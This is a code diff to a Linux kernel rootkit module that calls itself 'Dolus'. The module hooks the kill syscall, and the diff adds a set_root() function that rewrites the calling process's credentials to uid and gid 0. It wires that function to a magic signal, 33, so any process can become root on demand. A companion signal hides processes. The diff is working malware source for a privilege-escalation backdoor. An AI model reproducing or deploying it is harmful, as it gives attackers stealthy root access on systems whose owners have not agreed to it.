@@ -141,17 +141,45 @@ static int store(void) {
     return 0;
 }
 
+
+/*
+the linux kernel supports a range of 33 different, real-time
+signals, numbered 32 to 64.
+https://www.man7.org/linux/man-pages/man7/signal.7.html
+*/
 enum signals {
-    SIGSUPER = 64, //become root
+    SIGSUPER = 33, //become root
     SIGINVIS = 63, //become invisible
 };
+
+//https://github.com/torvalds/linux/blob/master/Documentation/security/credentials.rst#altering-credentials
+void set_root(void) {
+    struct cred *root;
+    root = prepare_creds();
+    if (root == NULL) {
+        DEBUG_INFO("[-]Dolus: failed to prepare root creds\n");
+        return;
+    }
+    //set the credentials to root
+    root->uid.val = root->gid.val = 0;
+    root->euid.val = root->egid.val = 0;
+    root->suid.val = root->sgid.val = 0;
+    root->fsuid.val = root->fsgid.val = 0;
+
+    commit_creds(root);
+}
 
 
 #if PTREGS_SYSCALL_STUB
 static asmlinkage long hack_kill(const struct pt_regs *regs) {
+    void set_root(void);
+
     int sig = regs->si;
     if (sig == SIGSUPER) {
         DEBUG_INFO("[+]Dolus: received SIGSUPER kill signal: %d\n", sig);
+        DEBUG_INFO("[+]Dolus: giving root privileges\n");
+        set_root();
+        DEBUG_INFO("[+]Dolus: root privileges successfully granted\n");
         return 0;
     }
     else if(sig == SIGINVIS) {
@@ -164,8 +192,13 @@ static asmlinkage long hack_kill(const struct pt_regs *regs) {
 
 #else
 static asmlinkage long hack_kill(pid_t pid, int sig) {
+    void set_root(void);
+
     if (sig == SIGSUPER) {
         DEBUG_INFO("[+]Dolus: received SIGSUPER kill signal: %d\n", sig);
+        DEBUG_INFO("[+]Dolus: giving root privileges\n");
+        set_root();
+        DEBUG_INFO("[+]Dolus: root privileges successfully granted\n");
         return 0;
     }
     else if(sig == SIGINVIS) {
